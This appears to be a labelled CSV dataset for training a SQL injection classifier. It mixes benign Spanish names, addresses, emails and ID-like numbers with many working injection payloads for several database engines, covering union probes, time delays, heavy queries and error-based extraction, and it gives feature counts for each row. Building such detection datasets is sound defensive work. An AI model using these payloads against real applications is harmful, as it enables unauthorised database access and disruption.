Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
victoria de los angeles,0,victoria de los angeles,23,4,0,0,0,0,3,0,0,20,0,0
03380,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1'))) union all select null,null,null--",1,union all select null null null,39,6,1,0,2,1,4,0,2,26,6,0
felipe olvera s/n 4?g,0,felipe olvera,21,2,0,0,1,0,3,0,1,15,0,0
c/ de la igualdad 191 8-h,0,de la igualdad,25,3,0,0,0,0,5,0,2,14,0,0
cabot@eurograb.tel,0,cabot eurograb tel,18,3,0,0,2,0,0,0,0,16,0,0
crovetto roger,0,crovetto roger,14,2,0,0,0,0,1,0,0,13,0,0
1764760587372326,0,,16,0,0,0,0,0,0,0,0,0,0,0
18178277c,0,18178277c,9,1,0,0,0,0,0,0,0,1,0,0
"1%"") and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""%""=""",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and,112,15,0,4,13,0,12,2,1,66,4,1
roca,0,roca,4,1,0,0,0,0,0,0,0,4,0,0
46194,0,,5,0,0,0,0,0,0,0,0,0,0,0
bf,0,bf,2,1,0,0,0,0,0,0,0,2,0,0
"-9281) where 8363=8363 or make_set(8220=5127,5127)--",1,where or make_set,52,3,0,0,4,1,4,1,3,14,2,1
pallen,0,pallen,6,1,0,0,0,0,0,0,0,6,0,0
guhl.monks@goscan.za,0,guhl monks goscan za,20,4,0,0,3,0,0,0,0,17,0,0
tie3t54,0,tie3t54,7,1,0,0,0,0,0,0,0,4,0,0
2a8um238638,0,2a8um238638,11,1,0,0,0,0,0,0,0,3,0,0
lagrange@zaya.bt,0,lagrange zaya bt,16,3,0,0,2,0,0,0,0,14,0,0
1%'));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,1,select case when then else select end,70,7,1,0,3,1,9,0,3,31,7,0
"avenida rafael cabrera, 24, 8?g",0,avenida rafael cabrera,31,3,0,0,3,0,4,0,0,21,0,0
"1"";select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",1,select case when then else select from information_schema character_sets end,111,10,0,1,6,1,11,0,1,65,8,0
beaulieu,0,beaulieu,8,1,0,0,0,0,0,0,0,8,0,0
17740,0,,5,0,0,0,0,0,0,0,0,0,0,0
c/ rio segura 76,0,rio segura,16,2,0,0,0,0,3,0,1,10,0,0
villatobas,0,villatobas,10,1,0,0,0,0,0,0,0,10,0,0
zamarroni aburto,0,zamarroni aburto,16,2,0,0,0,0,1,0,0,15,0,0
16360,0,,5,0,0,0,0,0,0,0,0,0,0,0
00863764e,0,00863764e,9,1,0,0,0,0,0,0,0,1,0,0
l8ci7ic55,0,l8ci7ic55,9,1,0,0,0,0,0,0,0,5,0,0
incisivo,0,incisivo,8,1,0,0,0,0,0,0,0,8,0,0
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""yzjl"" like ""yzjl",1,call regexp_substring repeat right char null and yzjl like yzjl,96,10,0,4,5,0,5,1,0,53,5,4
parmenia,0,parmenia,8,1,0,0,0,0,0,0,0,8,0,0
1%') and 4061=2730#,1,and,19,1,1,0,3,1,2,1,0,3,0,0
1'+(select iowv where 6105=6105 and sleep(5)#,1,select iowv where and sleep,45,5,1,0,2,1,5,1,1,23,3,1
0755793804862737,0,,16,0,0,0,0,0,0,0,0,0,0,0
asc60ca,0,asc60ca,7,1,0,0,0,0,0,0,0,5,0,0
rebolledo de la torre,0,rebolledo de la torre,21,4,0,0,0,0,3,0,0,18,0,0
guillena,0,guillena,8,1,0,0,0,0,0,0,0,8,0,0
8164,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1' where 4701=4701 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",1,where and row select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from select union select union select union select group by,222,22,1,0,9,1,21,1,5,104,14,5
87r5raviat8,0,87r5raviat8,11,1,0,0,0,0,0,0,0,7,0,0
beln,0,beln,4,1,0,0,0,0,0,0,0,4,0,0
"1%""))) union all select null,null--",1,union all select null null,35,5,0,1,2,1,4,0,2,22,5,0
oda,0,oda,3,1,0,0,0,0,0,0,0,3,0,0
jesusa,0,jesusa,6,1,0,0,0,0,0,0,0,6,0,0
comba,0,comba,5,1,0,0,0,0,0,0,0,5,0,0
37210,0,,5,0,0,0,0,0,0,0,0,0,0,0
1'+(select tart where 9861=9861;begin dbms_lock.sleep(5); end--,1,select tart where begin dbms_lock sleep end,63,7,1,0,5,1,5,0,3,36,4,1
landau silvestre,0,landau silvestre,16,2,0,0,0,0,1,0,0,15,0,0
villargordo del cabriel,0,villargordo del cabriel,23,3,0,0,0,0,2,0,0,21,0,0
"1)) as qzmg where 4344=4344 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",1,as qzmg where procedure analyse extractvalue concat 0x5c benchmark md5 0x52515a50,119,11,0,0,5,1,6,0,2,60,2,6
"1"") and sleep(5) and (""fsuf"" like ""fsuf",1,and sleep and fsuf like fsuf,39,6,0,4,0,0,6,2,0,23,3,1
"1"") where 8588=8588;select (case when (3217=8421) then 3217 else cast(1 as int)/(select 0 from dual) end) from dual--",1,where select case when then else cast as int select from dual end from dual,117,15,0,1,3,1,17,0,3,61,11,0
4226046499602528,0,,16,0,0,0,0,0,0,0,0,0,0,0
evin,0,evin,4,1,0,0,0,0,0,0,0,4,0,0
"c/ alqueria de rubiols, s/n, 11?d",0,alqueria de rubiols,33,3,0,0,3,0,5,0,2,21,0,0
sonsoles,0,sonsoles,8,1,0,0,0,0,0,0,0,8,0,0
17403,0,,5,0,0,0,0,0,0,0,0,0,0,0
1%')) or sleep(5) and (('%'=',1,or sleep and,29,3,4,0,3,0,4,2,0,10,2,1
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""rrbl""=""rrbl",1,and ctxsys drithsx sn chr chr chr chr chr select case when then else end from dual chr chr chr chr chr and rrbl rrbl,217,25,0,4,26,0,14,2,0,92,9,10
raudres,0,raudres,7,1,0,0,0,0,0,0,0,7,0,0
2o0eri23,0,2o0eri23,8,1,0,0,0,0,0,0,0,4,0,0
31096,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-9615) as dntk where 4780=4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,as dntk where union all select,88,6,0,0,9,1,8,0,1,25,5,0
reddick,0,reddick,7,1,0,0,0,0,0,0,0,7,0,0
89c3via,0,89c3via,7,1,0,0,0,0,0,0,0,4,0,0
"1"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""auyv""=""auyv",1,and select upper xmltype chr chr chr chr chr chr chr select case when then else end from dual chr chr chr chr chr chr from dual and auyv auyv,255,30,0,4,29,0,17,2,0,112,11,15
89590939m,0,89590939m,9,1,0,0,0,0,0,0,0,1,0,0
roelos de sayago,0,roelos de sayago,16,3,0,0,0,0,2,0,0,14,0,0
5h5c8,0,5h5c8,5,1,0,0,0,0,0,0,0,2,0,0
quitral blasi,0,quitral blasi,13,2,0,0,0,0,1,0,0,12,0,0
1) where 2734=2734 waitfor delay '0:0:5'--,1,where waitfor delay,42,3,2,0,3,1,5,0,2,17,1,2
jamaal,0,jamaal,6,1,0,0,0,0,0,0,0,6,0,0
"1'+(select qymy where 8657=8657 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,select qymy where and char char char char regexp_substring repeat left crypt_key char char char null null,172,17,1,0,18,1,5,1,3,87,6,11
stadlen@asociaciondearquitectoslatinoamericanos.tc,0,stadlen asociaciondearquitectoslatinoamericanos tc,50,3,0,0,2,0,0,0,0,48,0,0
21184515c,0,21184515c,9,1,0,0,0,0,0,0,0,1,0,0
9661992110368091,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1%"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""%""=""",1,and select if select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and,171,13,0,4,10,0,12,2,2,52,8,3
1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--,1,where select case when then else select end,82,8,0,0,3,1,11,0,3,36,8,0
"1"") as oztl where 6655=6655 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,as oztl where or select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,129,19,0,1,7,1,15,1,3,82,8,1
villanueva de algaidas,0,villanueva de algaidas,22,3,0,0,0,0,2,0,0,20,0,0
he82,0,he82,4,1,0,0,0,0,0,0,0,2,0,0
"-1269' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'gohv' like 'gohv",1,or convert int select char char char char char select case when then char else char end char char char char char and gohv like gohv,223,26,4,0,3,0,15,2,11,106,10,12
"1)) as huxq where 7451=7451 union all select null,null,null--",1,as huxq where union all select null null null,61,9,0,0,3,1,8,0,2,37,8,0
"calle aluders, 96",0,calle aluders,17,2,0,0,1,0,2,0,0,12,0,0
"1%' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3,98,16,1,0,7,1,11,1,3,64,6,1
"calle reina violante, 35,",0,calle reina violante,25,3,0,0,2,0,3,0,0,18,0,0
castilla s/n,0,castilla,12,1,0,0,0,0,1,0,1,10,0,0
43736,0,,5,0,0,0,0,0,0,0,0,0,0,0
mallat paiva,0,mallat paiva,12,2,0,0,0,0,1,0,0,11,0,0
duo_davalos@designworld.cz,0,duo_davalos designworld cz,26,3,0,0,3,0,0,0,0,23,0,0
"1"";(select * from (select(sleep(5)))srmq) and ""wsmz"" like ""wsmz",1,select from select sleep srmq and wsmz like wsmz,63,9,0,4,1,0,7,1,1,40,5,1
grueneic,0,grueneic,8,1,0,0,0,0,0,0,0,8,0,0
-4803%')) or 8571=8571--,1,or,24,1,1,0,2,1,2,1,3,2,0,0
malditamente,0,malditamente,12,1,0,0,0,0,0,0,0,12,0,0
"c/ madrid, 53 5-f",0,madrid,17,1,0,0,1,0,3,0,2,8,0,0
)i,0,,2,0,0,0,0,0,0,0,0,1,0,0
"1%"" union all select null,null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null null,66,12,0,1,10,1,4,0,0,50,12,0
1'||(select 'ifts' from dual where 6329=6329;begin dbms_lock.sleep(5); end--,1,select ifts from dual where begin dbms_lock sleep end,76,9,3,0,7,1,7,0,2,44,5,1
rhett,0,rhett,5,1,0,0,0,0,0,0,0,5,0,0
46266,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded",1,or elt sleep and pded pded,52,6,4,0,3,0,4,2,0,21,2,2
1')) as xpmy where 5274=5274 rlike (select (case when (6252=7704) then 1 else 0x28 end))--,1,as xpmy where rlike select case when then else 0x28 end,90,11,1,0,2,1,14,0,2,42,9,0
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",1,select like abcdefg upper hex randomblob and,78,7,6,0,5,0,3,1,1,38,3,3
espineta astorquiza,0,espineta astorquiza,19,2,0,0,0,0,1,0,0,18,0,0
2174818451824569,0,,16,0,0,0,0,0,0,0,0,0,0,0
1'+(select yjyp where 9696=9696;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,1,select yjyp where select case when then else cast as int select from dual end from dual,129,17,1,0,3,1,18,0,4,71,12,0
sant jaume dels domenys,0,sant jaume dels domenys,23,4,0,0,0,0,3,0,0,20,0,0
"primavera, 174",0,primavera,14,1,0,0,1,0,1,0,0,9,0,0
regenta,0,regenta,7,1,0,0,0,0,0,0,0,7,0,0
contrariosa,0,contrariosa,11,1,0,0,0,0,0,0,0,11,0,0
"1"")) union all select null,null--",1,union all select null null,33,5,0,1,1,1,4,0,2,22,5,0
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'adsh'='adsh",1,or char char char char regexp_substring repeat left crypt_key char char char null null and adsh adsh,159,17,4,0,18,0,4,2,0,82,5,11
kalila,0,kalila,6,1,0,0,0,0,0,0,0,6,0,0
"-7194'||(select 'gbrx' from dual where 6205=6205 union all select 6205,6205,6205,6205,6205,6205,6205#",1,select gbrx from dual where union all select,101,8,3,0,10,1,9,0,1,37,6,0
05659,0,,5,0,0,0,0,0,0,0,0,0,0,0
korbel,0,korbel,6,1,0,0,0,0,0,0,0,6,0,0
"1"";select benchmark(5000000,md5(0x4c4d6142)) and ""azzv"" like ""azzv",1,select benchmark md5 0x4c4d6142 and azzv like azzv,66,8,0,4,2,0,5,1,0,35,3,2
"juan vazquez, 112,",0,juan vazquez,18,2,0,0,2,0,2,0,0,11,0,0
borio-radichev@lingote.com.gr,0,borio radichev lingote com gr,29,5,0,0,3,0,0,0,1,25,0,0
40139732v,0,40139732v,9,1,0,0,0,0,0,0,0,1,0,0
salva carol,0,salva carol,11,2,0,0,0,0,1,0,0,10,0,0
ciara,0,ciara,5,1,0,0,0,0,0,0,0,5,0,0
"1)) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((5200=5200",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and,170,26,0,0,8,0,21,2,1,112,11,1
"-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",1,where union all select,79,4,0,0,9,1,6,0,1,19,4,0
denver,0,denver,6,1,0,0,0,0,0,0,0,6,0,0
"c/ padre ignacio ellaguria, 117 6-e",0,padre ignacio ellaguria,35,3,0,0,1,0,5,0,2,23,0,0
1'+(select onzd where 8452=8452 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))+',1,select onzd where and cast chr chr chr chr chr select case when then else end text chr chr chr chr chr as numeric,221,24,2,0,25,0,15,1,2,90,10,10
greaves3,0,greaves3,8,1,0,0,0,0,0,0,0,7,0,0
p`ie,0,ie,8,1,0,0,1,0,0,0,0,3,0,0
"estao, 92 4?c",0,estao,13,1,0,0,2,0,2,0,0,6,0,0
-2912')) order by 1--,1,order by,21,2,1,0,0,1,3,0,3,7,2,0
otvar,0,otvar,5,1,0,0,0,0,0,0,0,5,0,0
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",1,as kycl where or like abcdefg upper hex randomblob,89,9,2,0,3,1,6,1,3,42,4,3
5,0,,2,0,0,0,0,0,0,0,0,0,0,0
"-6659') where 1256=1256 union all select 1256,1256--",1,where union all select,52,4,1,0,2,1,6,0,3,19,4,0
maraa,0,maraa,5,1,0,0,0,0,0,0,0,5,0,0
pujals ogando,0,pujals ogando,13,2,0,0,0,0,1,0,0,12,0,0
p,0,,2,0,0,0,0,0,0,0,0,1,0,0
desnuda,0,desnuda,7,1,0,0,0,0,0,0,0,7,0,0
"1"")));waitfor delay '0:0:5' and (((""mfro"" like ""mfro",1,waitfor delay and mfro like mfro,52,6,2,4,3,0,6,1,0,27,2,2
"calle alpens 41, 2?g",0,calle alpens,20,2,0,0,2,0,3,0,0,12,0,0
37427,0,,5,0,0,0,0,0,0,0,0,0,0,0
"-1302"")) as rshr where 2800=2800 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",1,as rshr where or dbms_utility sqlid_to_sqlhash chr chr chr chr chr select case when then else end from dual chr chr chr chr chr,236,24,0,1,27,1,16,1,3,101,10,12
novisedl9,0,novisedl9,9,1,0,0,0,0,0,0,0,8,0,0
"-3347%"" or 9323=9323#",1,or,21,1,0,1,3,1,2,1,1,2,0,0
evacuacin,0,evacuacin,9,1,0,0,0,0,0,0,0,9,0,0
"1""))) and 4595=4595#",1,and,20,1,0,1,2,1,2,1,0,3,0,0
coallier,0,coallier,8,1,0,0,0,0,0,0,0,8,0,0
erich,0,erich,5,1,0,0,0,0,0,0,0,5,0,0
08363269d,0,08363269d,9,1,0,0,0,0,0,0,0,1,0,0
"1) where 4710=4710 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",1,where procedure analyse extractvalue concat 0x5c 0x7171706a71 select case when then else end 0x717a767a71,150,14,0,0,7,1,12,0,2,71,7,4
"1"" or (select * from (select(sleep(5)))ydpu) and ""uvoq"" like ""uvoq",1,or select from select sleep ydpu and uvoq like uvoq,66,10,0,4,0,0,9,2,1,42,6,1
1%')) rlike (select * from (select(sleep(5)))vwyq)#,1,rlike select from select sleep vwyq,51,6,1,0,2,1,5,0,1,30,4,1
-5555)) as ldte where 4583=4583 order by 1#,1,as ldte where order by,43,5,0,0,2,1,7,0,1,18,4,0
delvalle llers,0,delvalle llers,14,2,0,0,0,0,1,0,0,13,0,0
mae,0,mae,3,1,0,0,0,0,0,0,0,3,0,0
catatipia,0,catatipia,9,1,0,0,0,0,0,0,0,9,0,0
"c/ cristu benditu, 112, 12?g",0,cristu benditu,28,2,0,0,3,0,4,0,1,15,0,0
43232451h,0,43232451h,9,1,0,0,0,0,0,0,0,1,0,0
dellinge,0,dellinge,8,1,0,0,0,0,0,0,0,8,0,0
calle colegio mayor goimendi 72 4?d,0,calle colegio mayor goimendi,35,4,0,0,1,0,5,0,0,26,0,0
"1) where 4711=4711;select count(*) from generate_series(1,5000000)--",1,where select count from generate_series,68,5,0,0,4,1,5,0,3,34,3,1
darelle,0,darelle,7,1,0,0,0,0,0,0,0,7,0,0
lilias,0,lilias,6,1,0,0,0,0,0,0,0,6,0,0
"lapa, la",0,lapa la,8,2,0,0,1,0,1,0,0,6,0,0
boom@paseotuperro.mo,0,boom paseotuperro mo,20,3,0,0,2,0,0,0,0,18,0,0
c/ virgen del pilar 144,0,virgen del pilar,23,3,0,0,0,0,4,0,1,15,0,0
34340,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"") as upjw where 3880=3880 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,as upjw where and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,126,17,0,1,11,1,14,1,3,74,5,1
68889499z,0,68889499z,9,1,0,0,0,0,0,0,0,1,0,0
ges,0,ges,3,1,0,0,0,0,0,0,0,3,0,0
quintanilla de urz,0,quintanilla de urz,18,3,0,0,0,0,2,0,0,16,0,0
ostyn.martan@icodea.lu,0,ostyn martan icodea lu,22,4,0,0,3,0,0,0,0,19,0,0
3j,0,3j,2,1,0,0,0,0,0,0,0,1,0,0
x ctue,0,tue,8,1,0,0,0,0,1,0,0,5,0,0
ku,0,ku,2,1,0,0,0,0,0,0,0,2,0,0
93234482a,0,93234482a,9,1,0,0,0,0,0,0,0,1,0,0
tetona,0,tetona,6,1,0,0,0,0,0,0,0,6,0,0
"-7138"" union all select 2341,2341,2341,2341--",1,union all select,45,3,0,1,3,1,4,0,3,14,3,0
zahira,0,zahira,6,1,0,0,0,0,0,0,0,6,0,0
wessell.georg@smalltec.md,0,wessell georg smalltec md,25,4,0,0,3,0,0,0,0,22,0,0
"calle albia de castro, s/n",0,calle albia de castro,26,4,0,0,1,0,4,0,1,20,0,0
"c/ capella, 141, 4?g",0,capella,20,1,0,0,3,0,3,0,1,9,0,0
"calle doctor fleming, 7, 7-d",0,calle doctor fleming,28,3,0,0,2,0,4,0,1,19,0,0
introduccin,0,introduccin,11,1,0,0,0,0,0,0,0,11,0,0
"1"")) as ltco where 3862=3862 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",1,as ltco where or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,126,17,0,1,11,1,14,1,3,73,5,1
bevis,0,bevis,5,1,0,0,0,0,0,0,0,5,0,0
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",1,and extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71 and cfhi like cfhi,120,12,4,0,6,0,7,2,0,52,4,3
812,0,,3,0,0,0,0,0,0,0,0,0,0,0
02838,0,,5,0,0,0,0,0,0,0,0,0,0,0
"c/ geranio, 65",0,geranio,14,1,0,0,1,0,2,0,1,8,0,0
glazar@x2.com.net,0,glazar x2 com net,17,4,0,0,3,0,0,0,0,13,0,0
1%')));select (case when (9746=8055) then 9746 else 1/(select 0) end)--,1,select case when then else select end,71,7,1,0,3,1,9,0,3,31,7,0
lacero,0,lacero,6,1,0,0,0,0,0,0,0,6,0,0
rub,0,rub,3,1,0,0,0,0,0,0,0,3,0,0
"1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='",1,select case when then regexp_substring repeat right char null else char char char char end from information_schema system_users and,201,19,4,0,17,0,12,1,0,110,10,8
13348536a,0,13348536a,9,1,0,0,0,0,0,0,0,1,0,0
"1) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,155,25,0,0,7,1,19,1,3,109,10,1
2190197985147035,0,,16,0,0,0,0,0,0,0,0,0,0,0
gidget,0,gidget,6,1,0,0,0,0,0,0,0,6,0,0
05200,0,,5,0,0,0,0,0,0,0,0,0,0,0
"calle calderon de la barca, 141",0,calle calderon de la barca,31,5,0,0,1,0,5,0,0,22,0,0
50297,0,,5,0,0,0,0,0,0,0,0,0,0,0
